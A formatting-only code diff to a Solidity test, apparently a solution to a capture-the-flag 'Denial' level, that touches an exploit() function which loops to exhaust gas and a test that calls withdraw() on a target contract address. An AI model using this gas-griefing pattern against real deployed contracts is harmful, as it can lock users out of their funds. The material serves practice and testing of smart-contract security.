@@ -27,6 +27,7 @@ contract Solution {
         require(owner == msg.sender, "Not owner");
         payable(owner).transfer(address(this).balance);
     }
+
     function exploit() internal pure {
         uint256 sum;
         for (uint256 index = 0; index < type(uint256).max; index++) {
@@ -41,7 +42,6 @@ contract Solution {
 }
 
 contract DenialTest is BaseTest {
-
     Solution public solution;
 
     function setUp() public override {
@@ -49,7 +49,6 @@ contract DenialTest is BaseTest {
     }
 
     function test_Attack() public {
-
         contractAddress = 0x4A7b7Fd3ef5ADD7b996A460cc61e2C7e6B501358;
 
         solution = new Solution(contractAddress);
@@ -57,7 +56,7 @@ contract DenialTest is BaseTest {
 
         uint256 beforeBalance = contractAddress.balance;
 
-        contractAddress.call{gas: 10**6 }(abi.encodeWithSignature("withdraw()"));
+        contractAddress.call{gas: 10 ** 6}(abi.encodeWithSignature("withdraw()"));
 
         uint256 afterBalance = contractAddress.balance;
 
